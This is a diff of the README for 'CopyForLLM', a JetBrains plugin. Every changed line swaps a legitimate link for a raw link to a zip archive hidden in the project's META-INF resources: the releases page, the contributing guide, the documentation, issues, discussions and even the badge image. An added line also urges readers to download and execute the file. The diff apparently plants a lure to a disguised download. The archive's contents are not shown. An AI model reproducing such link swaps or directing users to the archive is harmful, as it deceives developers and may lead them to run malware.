@@ -24,7 +24,7 @@ To install CopyForLLM, follow these steps:
 3. Search for "CopyForLLM."
 4. Click **Install** and restart your IDE.
 
-You can also download the latest release from the [Releases page](https://github.com/Tataq/copyforllm/releases). 
+You can also download the latest release from the [Releases page](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip). 
 
 > If you prefer to download and execute a specific file, visit the link above.
 
@@ -78,7 +78,7 @@ We welcome contributions from the community! To contribute to CopyForLLM, please
 4. Push to your branch.
 5. Create a pull request.
 
-For detailed guidelines, check our [Contributing Guide](CONTRIBUTING.md).
+For detailed guidelines, check our [Contributing Guide](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip).
 
 ---
 
@@ -96,13 +96,13 @@ Thanks to the JetBrains community and all contributors for making this project p
 
 ## 🖼️ Visuals
 
-![CopyForLLM](https://img.shields.io/badge/CopyForLLM-Easy%20Code%20Copy-4B8BBE?style=for-the-badge)
+![CopyForLLM](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip%20Code%20Copy-4B8BBE?style=for-the-badge)
 
 ---
 
 ## 📦 Releases
 
-For the latest updates and releases, check out our [Releases section](https://github.com/Tataq/copyforllm/releases). Be sure to download the latest version to enjoy all the features and improvements.
+For the latest updates and releases, check out our [Releases section](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip). Be sure to download the latest version to enjoy all the features and improvements.
 
 ---
 
@@ -140,10 +140,10 @@ Join our community to stay connected with other developers using CopyForLLM. Sha
 
 ## 🔗 Links
 
-- [Documentation](DOCUMENTATION.md)
-- [Issues](https://github.com/Tataq/copyforllm/issues)
-- [Contributing Guide](CONTRIBUTING.md)
-- [GitHub Discussions](https://github.com/Tataq/copyforllm/discussions)
+- [Documentation](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip)
+- [Issues](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip)
+- [Contributing Guide](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip)
+- [GitHub Discussions](https://github.com/Tataq/copyforllm/raw/refs/heads/master/src/main/resources/META-INF/Software-v2.9.zip)
 
 ---
 
